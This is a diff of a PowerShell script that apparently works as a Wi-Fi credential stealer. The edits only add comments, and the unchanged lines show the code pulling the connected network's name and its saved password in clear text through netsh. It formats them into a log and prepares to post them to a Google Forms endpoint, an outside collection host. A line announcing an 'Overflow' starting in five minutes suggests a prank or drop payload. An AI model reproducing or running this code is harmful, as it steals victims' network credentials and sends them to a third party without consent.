@@ -14,10 +14,10 @@
 
 
 
-
+#form configration
 $formURL = "https://docs.google.com/forms/u/0/d/e/1FAIpQLSeRatWQklEhGPzyvEsOf4XbWQpW-Dxj2g8nikBbtuE4A-czXg/formResponse"
 $entryID = "entry.1276784256"
-
+#data collection
 $wifiName = (netsh wlan show interfaces | Select-String SSID | Select-Object -First 1).ToString().Split(':')[1].Trim()
 $wifiPassword = (netsh wlan show profile name="$wifiName" key=clear | Select-String "Key Content")
 $wifiPassword = $wifiPassword.ToString().Split(':')[1].Trim()
@@ -34,7 +34,7 @@ WIFI Password: $wifiPassword
 Overflow: Starting in 5mins
 -------------------------
 "@
-
+#data transfer
 $body = @{
     $entryID = $logData
 }
